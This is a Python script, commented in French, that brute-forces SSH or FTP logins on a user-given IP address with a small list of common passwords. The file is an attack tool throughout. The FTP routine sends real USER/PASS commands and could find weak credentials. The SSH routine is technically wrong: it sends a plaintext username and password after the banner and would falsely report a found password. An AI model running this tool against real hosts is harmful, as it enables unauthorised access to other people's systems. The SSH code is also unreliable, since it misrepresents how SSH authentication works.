import socket
import time

class Bruteforcer:
    def __init__(self, hostname, username, protocol):
        self.hostname = hostname
        self.username = username
        self.protocol = protocol.upper()

    def ssh_bruteforce(self, password_list):
        # Méthode pour le bruteforce SSH
        for idx, password in enumerate(password_list, 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.hostname, 22))  # Connexion au serveur SSH sur le port 22
                banner = sock.recv(1024).decode()  # Recevoir la bannière de connexion
                if 'SSH' not in banner:
                    print("Le service n'est pas un serveur SSH.")
                    return False
                
                # Envoi du nom d'utilisateur et du mot de passe au serveur SSH
                sock.send(f'{self.username}\n'.encode())
                sock.send(f'{password}\n'.encode())
                response = sock.recv(1024).decode()  # Recevoir la réponse du serveur
                if 'Permission denied' not in response:
                    print("Mot de passe trouvé pour SSH:", password)
                    sock.close()
                    return True
            except Exception as e:
                print("Erreur:", e)
                return False

        print("Aucun mot de passe trouvé pour SSH.")
        return False

    def ftp_bruteforce(self, password_list):
        # Méthode pour le bruteforce FTP
        for idx, password in enumerate(password_list, 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.hostname, 21))  # Connexion au serveur FTP sur le port 21
                response = sock.recv(1024).decode()  # Recevoir la réponse du serveur
                if '220' not in response:
                    print("Le serveur FTP n'a pas répondu correctement.")
                    return False
                
                # Envoi du nom d'utilisateur au serveur FTP
                sock.sendall(b'USER ' + self.username.encode() + b'\r\n')
                response = sock.recv(1024).decode()  # Recevoir la réponse du serveur
                if '331' not in response:
                    print("Nom d'utilisateur FTP invalide.")
                    return False
                
                # Envoi du mot de passe au serveur FTP
                sock.sendall(b'PASS ' + password.encode() + b'\r\n')
                response = sock.recv(1024).decode()  # Recevoir la réponse du serveur
                if '230' in response:
                    print("Mot de passe trouvé pour FTP:", password)
                    print("Nombre de tentatives :", idx)
                    sock.sendall(b'QUIT\r\n')  # Envoi de la commande QUIT pour terminer la session FTP
                    sock.close()
                    return True
            except Exception as e:
                print("Erreur:", e)
                return False

        print("Aucun mot de passe trouvé pour FTP.")
        return False

def main():
    # Récupération des informations de connexion
    hostname = input("Pouvez-vous me donnez une adresse IP ? ")
    protocol = input("Entrez le protocole à utiliser (SSH ou FTP) : ")
    username = input("Entrez le nom d'utilisateur : ")

    # Création de l'instance du bruteforcer
    bruteforcer = Bruteforcer(hostname, username, protocol)

    # Liste de mots de passe courants (vous pouvez ajouter davantage)
    common_passwords = ["123456", "qwerty", "letmein", "admin","password"]

    # Début du chronométrage
    start_time = time.time()

    # Sélection du protocole et exécution du bruteforce correspondant
    if bruteforcer.protocol == "SSH":
        result = bruteforcer.ssh_bruteforce(common_passwords)
    elif bruteforcer.protocol == "FTP":
        result = bruteforcer.ftp_bruteforce(common_passwords)
    else:
        print("Protocole non pris en charge.")
        return
    end_time = time.time()

    # Affichage des résultats
    if result:
        print("Connexion réussie!")
    else:
        print("Connexion échouée.")

    print("Nombre de tentatives :", len(common_passwords))
    print("Temps écoulé :", end_time - start_time, "secondes")

if __name__ == "__main__":
    main()
